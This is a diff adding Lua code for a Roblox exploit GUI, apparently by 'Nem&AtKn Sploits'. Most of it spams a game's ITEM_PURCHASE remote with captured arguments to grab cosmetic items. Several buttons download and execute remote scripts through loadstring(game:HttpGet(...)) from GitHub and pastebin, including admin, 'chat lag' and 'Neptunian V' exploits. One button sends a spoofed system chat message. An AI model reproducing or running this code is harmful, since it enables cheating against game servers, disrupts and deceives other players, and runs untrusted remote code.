+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(GRSX_fake_script)()
+local function JNFCDZ_fake_script() -- Rainbow_2.RainbowFunction 
+	local script = Instance.new('LocalScript', Rainbow_2)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(JNFCDZ_fake_script)()
+local function PONM_fake_script() -- CloseOpen_2.Script 
+	local script = Instance.new('Script', CloseOpen_2)
+
+	local hub = script.Parent.Parent.Hub
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then button.Text="+" hub.Visible=false
+	else hub.Visible=true button.Text="-"
+	end
+	end)
+end
+coroutine.wrap(PONM_fake_script)()
+local function MUDRL_fake_script() -- HatSpam.Dragify 
+	local script = Instance.new('LocalScript', HatSpam)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(MUDRL_fake_script)()
+local function UVTMC_fake_script() -- Admin.Script 
+	local script = Instance.new('Script', Admin)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+	end)
+end
+coroutine.wrap(UVTMC_fake_script)()
+local function GQDXOE_fake_script() -- ChatLag.Script 
+	local script = Instance.new('Script', ChatLag)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NemsploitsTM/Nem-AtKn-SPloits_TM/master/chat%20lag"))();
+	end)
+end
+coroutine.wrap(GQDXOE_fake_script)()
+local function YMQRV_fake_script() -- ChatTroll.Script 
+	local script = Instance.new('Script', ChatTroll)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	local A_1 = "hi                                                                                                                                              {System} Your friend Belle Delphine has joined the game."
+	local A_2 = "All"
+	local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+	Event:FireServer(A_1, A_2)
+	end)
+end
+coroutine.wrap(YMQRV_fake_script)()
+local function TIDMR_fake_script() -- NeptunainV.Script 
+	local script = Instance.new('Script', NeptunainV)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NemsploitsTM/Nem-AtKn-SPloits_TM/master/neptunian%20v%20%7Cr15%7Cr6%7C"))();
+	end)
+end
+coroutine.wrap(TIDMR_fake_script)()
+local function LLYRT_fake_script() -- NeptunainV.Message 
+	local script = Instance.new('LocalScript', NeptunainV)
+
+	local StarterGui = game:GetService("StarterGui")
+	local button = script.Parent
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	button.MouseButton1Click:Connect(function()
+		for i = 1, #Notifications do
+			local Notification = Notifications[i]
+				
+			StarterGui:SetCore("SendNotification", {
+				Title = "Fe Neptunian V";
+				Text = "Hats needed : Corrupt Demonic Greatsword";
+				Duration = 5;
+			})
+				
+			wait(TimeBetweenNotifications)
+		end
+	end)
+end
+coroutine.wrap(LLYRT_fake_script)()
+local function EIHYO_fake_script() -- Rainbow_3.RainbowFunction 
+	local script = Instance.new('LocalScript', Rainbow_3)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(EIHYO_fake_script)()
+local function IWBHSFT_fake_script() -- CloseOpen_3.Script 
+	local script = Instance.new('Script', CloseOpen_3)
+
+	local hub = script.Parent.Parent.Hub
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then button.Text="+" hub.Visible=false
+	else hub.Visible=true button.Text="-"
+	end
+	end)
+end
+coroutine.wrap(IWBHSFT_fake_script)()
+local function SAHWBFJ_fake_script() -- Fun.Dragify 
+	local script = Instance.new('LocalScript', Fun)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(SAHWBFJ_fake_script)()
+local function KEZRAEM_fake_script() -- ADiscord.Script 
+	local script = Instance.new('Script', ADiscord)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/TwyyG5mJ", true))()
+	end)
+end
+coroutine.wrap(KEZRAEM_fake_script)()
+local function ECFTZDS_fake_script() -- ADiscord.Message 
+	local script = Instance.new('LocalScript', ADiscord)
+
+	local StarterGui = game:GetService("StarterGui")
+	local button = script.Parent
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	button.MouseButton1Click:Connect(function()
+		for i = 1, #Notifications do
+			local Notification = Notifications[i]
+				
+			StarterGui:SetCore("SendNotification", {
+				Title = "Discord";
+				Text = "Coppied discord to clipboard!";
+				Icon = "rbxassetid://1734216532";
+				Duration = 5;
+			})
+				
+			wait(TimeBetweenNotifications)
+		end
+	end)
+end
+coroutine.wrap(ECFTZDS_fake_script)()
+local function NPNFJ_fake_script() -- Rainbow_4.RainbowFunction 
+	local script = Instance.new('LocalScript', Rainbow_4)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(NPNFJ_fake_script)()
+local function HWGQWHT_fake_script() -- CloseOpen_4.Script 
+	local script = Instance.new('Script', CloseOpen_4)
+
+	local hub = script.Parent.Parent.Hub
+	local button = script.Parent
+	local info = script.Parent.Parent.info
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then button.Text="+" hub.Visible=false info.Visible=false
+	else hub.Visible=true button.Text="-" info.Visible=true
+	end
+	end)
+end
+coroutine.wrap(HWGQWHT_fake_script)()
+local function YATTU_fake_script() -- Credits.Dragify 
+	local script = Instance.new('LocalScript', Credits)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(YATTU_fake_script)()
+local function XSOQ_fake_script() -- TO.Message 
+	local script = Instance.new('LocalScript', TO)
+
+	local StarterGui = game:GetService("StarterGui")
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	for i = 1, #Notifications do
+		local Notification = Notifications[i]
+			
+		StarterGui:SetCore("SendNotification", {
+			Title = "Nem&AtKn Sploits™";
+			Text = "Gui made by Nem&AtKn Sploits™";
+			Icon = "rbxassetid://4833960080";
+			Duration = 7;
+		})
+			
+		wait(TimeBetweenNotifications)
+	end
+end
+coroutine.wrap(XSOQ_fake_script)()
